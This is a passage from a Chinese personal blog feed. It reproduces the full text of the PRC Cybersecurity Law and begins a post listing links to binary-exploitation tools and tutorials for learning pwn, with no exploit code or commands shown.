<h1 id="友情链接：蛋哥的实验报告"><a href="#友情链接：蛋哥的实验报告" class="headerlink" title="友情链接：蛋哥的实验报告"></a>友情链接：<a href="https://tiaonmmn.github.io/2017/11/27/%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86" target="_blank" rel="noopener">蛋哥的实验报告</a></h1><p>我不生产实验报告，我只是实验报告的<strong>搬运工</strong><br>Perfect，搞定。<br><a id="more"></a></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31246600&auto=1&height=66"></iframe>]]></content>
      
        
        <tags>
            
            <tag> 课程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[中华人民共和国网络安全法]]></title>
      <url>/2017/12/15/lay-wlaqf/</url>
      <content type="html"><![CDATA[<p><img src="/2017/12/15/lay-wlaqf/1.jpg" alt=""></p>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><pre><code>第一章 总 则
第二章 网络安全支持与促进
第三章 网络运行安全
第一节 一般规定
第二节 关键信息基础设施的运行安全
第四章 网络信息安全
第五章 监测预警与应急处置
第六章 法律责任
第七章 附 则
</code></pre><a id="more"></a>
<h1 id="条文"><a href="#条文" class="headerlink" title="条文"></a>条文</h1><h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p>
<p>第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p>
<p>第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p>
<p>第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p>
<p>第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p>
<p>第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p>
<p>第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p>
<p>第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。<br>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p>
<p>第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p>
<p>第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p>
<p>第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p>
<p>第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。<br>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p>
<p>第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p>
<p>第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。<br>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p>
<h2 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h2><p>第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。<br>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p>
<p>第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p>
<p>第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p>
<p>第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。<br>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p>
<p>第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。<br>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p>
<p>第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p>
<h2 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h2><p>第一节 一般规定</p>
<p>第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p>
<pre><code>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；
（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；
（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；
（四）采取数据分类、重要数据备份和加密等措施；
（五）法律、行政法规规定的其他义务。
</code></pre><p>第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。<br>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。<br>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p>
<p>第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p>
<p>第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。<br>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p>
<p>第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p>
<p>第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p>
<p>第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p>
<p>第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p>
<p>第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。<br>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p>
<p>第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。<br>第二节 关键信息基础设施的运行安全</p>
<p>第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。<br>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p>
<p>第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p>
<p>第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p>
<p>第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p>
<pre><code>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；
（二）定期对从业人员进行网络安全教育、技术培训和技能考核；
（三）对重要系统和数据库进行容灾备份；
（四）制定网络安全事件应急预案，并定期进行演练；
（五）法律、行政法规规定的其他义务。
</code></pre><p>第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p>
<p>第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p>
<p>第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p>
<p>第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p>
<p>第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p>
<pre><code>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；
（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；
（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；
（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。
</code></pre><h2 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h2><p>第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p>
<p>第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。<br>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p>
<p>第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。<br>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p>
<p>第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。<br>第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p>
<p>第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p>
<p>第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p>
<p>第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p>
<p>第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。<br>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p>
<p>第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。<br>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p>
<p>第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p>
<h2 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h2><p>第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p>
<p>第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p>
<p>第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。<br>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。<br>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p>
<p>第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p>
<pre><code>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；
（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；
（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。
</code></pre><p>第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p>
<p>第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p>
<p>第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p>
<p>第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p>
<h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h2><p>第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。<br>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p>
<p>第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p>
<pre><code>（一）设置恶意程序的；
（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；
（三）擅自终止为其产品、服务提供安全维护的。
</code></pre><p>第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p>第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p>
<p>第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p>
<p>第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。<br>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p>
<p>第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p>第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p>第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。<br>单位有欠款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p>
<p>第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。<br>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p>
<p>第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p>
<pre><code>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；
（二）拒绝、阻碍有关部门依法实施的监督检查的；
（三）拒不向公安机关、国家安全机关提供技术支持和协助的。
</code></pre><p>第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p>
<p>第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p>
<p>第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p>
<p>第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。<br>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p>
<p>第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。<br>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p>
<p>第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。<br>第七章 附 则</p>
<p>第七十六条 本法下列用语的含义：</p>
<pre><code>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。
（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。
（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。
（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。
（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。
</code></pre><p>第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p>
<p>第七十八条 军事网络的安全保护，由中央军事委员会另行规定。</p>
<p>第七十九条 本法自2017年6月1日起施行。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=416552507&auto=1&height=66"></iframe>]]></content>
      
        
        <tags>
            
            <tag> 警察 </tag>
            
            <tag> 法律 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pwn思路]]></title>
      <url>/2017/12/12/study-pwn/</url>
      <content type="html"><![CDATA[<p><img src="/2017/12/12/study-pwn/1.jpg" alt=""><br>Mark一下Software-Security-Learning的pwn学习思路，希望自己按照这个能系统的学习一下pwn。<br>github地址在<a href="https://chybeta.github.io/2017/08/19/Software-Security-Learning/" target="_blank" rel="noopener">Software-Security-Learning</a><br><a id="more"></a></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=32192216&auto=1&height=66"></iframe>

<h1 id="Bin-Securiy"><a href="#Bin-Securiy" class="headerlink" title="Bin Securiy"></a>Bin Securiy</h1><ul>
<li><a href="https://github.com/feicong/sec_skills" target="_blank" rel="noopener">软件安全工程师技能表</a></li>
</ul>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
<li><a href="https://github.com/cmu-sei/pharos" target="_blank" rel="noopener">pharos: Automated static analysis tools for binary programs</a></li>
<li><a href="https://github.com/angr/angr" target="_blank" rel="noopener">Angr：The next-generation binary analysis platform </a></li>
<li><a href="http://www.freebuf.com/sectool/143056.html" target="_blank" rel="noopener">Angr：一个具有动态符号执行和静态分析的二进制分析工具 </a></li>
<li><a href="http://bestwing.me/2017/03/08/angr-study/" target="_blank" rel="noopener">angr初探</a></li>
<li><a href="http://www.freebuf.com/articles/web/150296.html" target="_blank" rel="noopener">符号执行：利用Angr进行简单CTF逆向分析 </a></li>
<li><a href="http://www.freebuf.com/sectool/143123.html" target="_blank" rel="noopener">Vuzzer自动漏洞挖掘工具简单分析附使用介绍</a></li>
<li><a href="https://github.com/longld/peda" target="_blank" rel="noopener">PEDA - Python Exploit Development Assistance for GDB</a></li>
<li><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools - CTF framework and exploit development library</a></li>
</ul>
<h2 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h2><ul>
<li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">Modern Binary Exploitation</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="noopener">Linux (x86) Exploit Development Series</a></li>
<li><a href="http://liveoverflow.com/binary_hacking/index.html" target="_blank" rel="noopener">liveoverflow: Binary Hacking Course</a></li>
<li><a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="noopener">Lots of Tutorials</a></li>
</ul>
<h3 id="Hack-The-Virtual-Memory"><a href="#Hack-The-Virtual-Memory" class="headerlink" title="Hack The Virtual Memory"></a>Hack The Virtual Memory</h3><ul>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-c-strings-proc/" target="_blank" rel="noopener">Hack The Virtual Memory: C strings &amp; /proc</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-python-bytes/" target="_blank" rel="noopener">Hack The Virtual Memory: Python bytes</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-drawing-the-vm-diagram/" target="_blank" rel="noopener">Hack the Virtual Memory: drawing the VM diagram</a></li>
<li><a href="https://blog.holbertonschool.com/hack-the-virtual-memory-malloc-the-heap-the-program-break/" target="_blank" rel="noopener">Hack the Virtual Memory: malloc, the heap &amp; the program break</a></li>
</ul>
<h3 id="Exploit-writing-tutorial"><a href="#Exploit-writing-tutorial" class="headerlink" title="Exploit writing tutorial"></a>Exploit writing tutorial</h3><ul>
<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="noopener">Stack Based Overflows</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" target="_blank" rel="noopener">Stack Based Overflows – jumping to shellcode</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener">SEH Based Exploits</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" target="_blank" rel="noopener">SEH Based Exploits – just another example</a></li>
<li><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/" target="_blank" rel="noopener">From Exploit to Metasploit – The basics</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" target="_blank" rel="noopener">How debugger modules &amp; plugins can speed up basic exploit development</a></li>
<li><a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" target="_blank" rel="noopener">Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
<li><a href="https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/" target="_blank" rel="noopener">Unicode – from 0x00410041 to calc</a></li>
<li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">Win32 Egg Hunting</a></li>
<li><a href="https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/" target="_blank" rel="noopener">Introduction to Win32 shellcoding</a></li>
